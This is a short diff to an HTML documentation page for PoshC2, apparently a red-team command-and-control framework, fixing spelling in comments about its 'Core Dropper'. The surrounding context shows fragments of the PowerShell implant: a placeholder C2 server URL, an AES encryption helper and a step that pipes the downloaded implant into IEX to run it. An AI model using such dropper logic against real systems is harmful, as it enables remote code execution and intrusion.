@@ -183,10 +183,10 @@
   <div class="section" id="core-dropper">
 <h1>Core Dropper<a class="headerlink" href="#core-dropper" title="Permalink to this headline">¶</a></h1>
 <p>The following code contains the core implant which is the basis for all droppers found in PoshC2:</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span>  # PoshC2 Server Url
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>  # PoshC2 Server Url
   $s=&quot;https://www.example.com&quot;
 
-  # creates a randon AES symetric encryption key
+  # creates a random AES symmetric encryption key
   function CAM ($key,$IV){
     $a = New-Object -TypeName &quot;System.Security.Cryptography.RijndaelManaged&quot;
     $a.Mode = [System.Security.Cryptography.CipherMode]::CBC
@@ -301,7 +301,7 @@
 
   $primer = primer
 
-  # once the core implant has been downloaded sucessfully pass to IEX
+  # once the core implant has been downloaded successfully pass to IEX
   if ($primer) {
           $primer | iex
   } else {
